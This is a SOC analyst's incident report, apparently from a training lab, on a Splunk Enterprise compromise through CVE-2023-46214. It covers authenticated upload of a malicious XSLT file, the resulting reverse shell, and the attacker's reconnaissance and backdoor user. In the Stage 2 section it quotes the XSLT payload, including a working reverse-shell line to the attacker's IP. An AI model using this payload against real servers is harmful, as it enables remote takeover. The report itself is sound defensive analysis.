#  SOC239 - Remote Code Execution Detected in Splunk Enterprise

## Executive Summary

On November 21, 2023, the Security Operations Center (SOC) detected a successful Remote Code Execution (RCE) attack against a **Splunk Enterprise** server (172.16.20.13). The investigation confirmed that an external attacker from the IP address **180.101.88.240** exploited **CVE-2023-46214**. The attacker first authenticated using compromised credentials, then uploaded a malicious XSLT file (`shell.xsl`) that abused Splunk's file preview functionality to write a reverse shell script (`shell.sh`) to disk. Network logs confirm the reverse shell was activated, giving the attacker interactive access. Endpoint logs show the attacker then performed reconnaissance and created a new local user (`analsyt`) for persistence. This is a **True Positive** for a full server compromise.

## Incident Details

The initial alert was triggered by the malicious XSLT upload indicative of the Splunk RCE vulnerability:

<img width="1515" height="577" alt="image" src="https://github.com/user-attachments/assets/a2d98bcf-9c7e-44b7-ac36-95ee9fcaa15e" />

| | |
| :--- | :--- |
| **Date of Incident**| November 21, 2023 |
| **Attacker IP**| 180.101.88.240 |
| **Destination Host**| Splunk Enterprise (172.16.20.13) |
| **Malicious Files**| `shell.xsl`, `shell.sh` |
| **Vulnerability**| CVE-2023-46214 |
| **Attack Type**| Remote Code Execution (RCE) |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/201))* |

## Investigation and Analysis

### 1. Vulnerability Profile: Splunk RCE via XSLT Upload (CVE-2023-46214)

**CVE-2023-46214** is a critical vulnerability affecting the Splunk App for Lookup File Editing. It is not an unauthenticated vulnerability; the attacker must first possess valid user credentials.

*   **How it Works:** The vulnerability exists because the application fails to properly sanitize user-supplied Extensible Stylesheet Language Transformations (XSLT) files during the file upload/preview process. The `exsl:document` element within an XSLT file can be abused to write arbitrary content to an arbitrary file on the server's filesystem.
*   **The Exploit Chain:**
    1.  Attacker logs in with valid (likely stolen) credentials.
    2.  Attacker uploads a crafted XSLT file. This file contains instructions to create a *new* file (e.g., a shell script) at a specific location on the server. The content of this new file is also embedded within the XSLT.
    3.  When the Splunk server processes the uploaded XSLT (e.g., for a preview), it executes the malicious instructions, creating the shell script on disk.
    4.  The attacker can then trigger or access this new script, achieving RCE.

### 2. Deconstructing the Attack via Log Analysis

The logs show a clear, step-by-step execution of the exploit chain.

**Stage 1: Authenticated Access**
The attacker first logged into the Splunk server. The log shows a successful login for the `admin` user from the attacker's IP. The password (`SPLUNK-i-04...`) appears to be a default or weak password.
<img width="644" height="248" alt="image" src="https://github.com/user-attachments/assets/3081c127-ff75-47b5-a6a1-a19ce6082fac" />

**Stage 2: Malicious File Upload**
The attacker then used their authenticated session to upload the weaponized `shell.xsl` file. The URL shows them accessing the `__upload/indexing/preview` endpoint, which is the vulnerable component.
<img width="640" height="217" alt="image" src="https://github.com/user-attachments/assets/ec78f783-a684-4e4e-b472-8c5a7f3e1739" />

*   **`shell.xsl` Content:** This file contained instructions to create a new file named `shell.sh` in the `/opt/splunk/bin/scripts/` directory.
    ```xsl
    <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
        <xsl:text>sh -i >& /dev/tcp/180.101.88.240/1923 0>&1</xsl:text>
    </exsl:document>
    ```

*   **`shell.sh` Content:** The content written to this new file is a classic one-line reverse shell. It instructs the server to initiate an interactive shell (`sh -i`) and redirect all its input and output (`>& ... 0>&1`) over a TCP connection to the attacker's C2 server (`180.101.88.240`) on port `1923`.

**Stage 3: Reverse Shell Activation**
Network logs confirm that the reverse shell was successfully activated. The Splunk server (`18.219.80.54`) is seen making an outbound connection *to* the attacker's IP on the specified port.
<img width="639" height="305" alt="image" src="https://github.com/user-attachments/assets/48de4954-9c16-4af8-87f3-34ad51cdff4f" />

### 3. Post-Exploitation Activity (Endpoint Analysis)

With an active reverse shell, the attacker had full command-line access. The endpoint logs show their actions:
*   **Reconnaissance:** The attacker immediately ran commands like `id`, `whoami`, and `groups` to understand their user context and privilege level.
    <img width="1135" height="209" alt="image" src="https://github.com/user-attachments/assets/ea5ebd5c-df39-42ca-95e4-8dae42a06555" />
*   **Establishing Persistence:** The attacker created a new local user account named `analsyt` and set a password for it. This creates a persistent backdoor for them to log in later, even if the initial Splunk vulnerability is patched or the admin password is changed.
    <img width="1156" height="245" alt="image" src="https://github.com/user-attachments/assets/b1e5f700-beb0-4557-8c1a-2ef71a8e025d" />

### 4. Threat Intelligence

The attacker's IP `180.101.88.240` is a known malicious actor with a poor reputation on VirusTotal (4 detections) and a very high number of reports on AbuseIPDB (over 47,000).

<img width="1814" height="762" alt="image" src="https://github.com/user-attachments/assets/533e785a-0c9f-4727-a9f0-d1cc70b52b59" />
<img width="1615" height="799" alt="image" src="https://github.com/user-attachments/assets/c5de4821-43c8-45b7-b32e-3c728ee1c770" />

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Network Logs, VirusTotal, AbuseIPDB, Static Analysis
*   **Skills Demonstrated:** RCE Analysis, Vulnerability Triage (CVE-2023-46214), Log Correlation, Post-Exploitation Analysis, Persistence Technique Recognition.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** It's a successful RCE attack from a known-bad IP.
*   **What Is The Attack Type?** **Remote Code Execution (RCE).**
*   **Was the Attack Successful?** **Yes.** Confirmed RCE, reverse shell, and creation of a new user account.
*   **Do You Need Tier 2 Escalation?** **Yes.** A full server compromise requires immediate escalation.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC239 was a **true positive** for a successful RCE attack on the Splunk Enterprise server. The attacker leveraged compromised credentials to exploit CVE-2023-46214, established a reverse shell, and created a new user account for persistence. The server is fully compromised.

**Recommendations:**

1.  **CONTAINMENT - Isolate Server Immediately:** Disconnect the **Splunk Enterprise** server (172.16.20.13) from the network to terminate the reverse shell and prevent further attacker activity.
2.  **PATCH IMMEDIATELY:** Apply the security patches released by Splunk for CVE-2023-46214.
3.  **CREDENTIALS - Reset All:** All credentials on the Splunk server must be considered compromised. The `admin` password and all other user passwords must be reset immediately.
4.  **ESCALATE:** Escalate this incident to the Tier 2/Incident Response (IR) team for full forensic analysis.
5.  **INVESTIGATION:** The IR team must remove the attacker's persistence (`analsyt` user) and search for any other backdoors or modifications. They must also analyze what data the attacker may have accessed or exfiltrated from the Splunk instance.
6.  **RECOVERY:** The server should be rebuilt from a known-good backup from *before* the incident date. Simply patching the running system is not sufficient after a compromise of this level.
7.  **BLOCK INDICATORS:** Block the attacker's IP address `180.101.88.240` at the network firewall.
8.  **PASSWORD POLICY:** Review and strengthen the password policy for Splunk accounts to prevent the use of weak or default credentials.
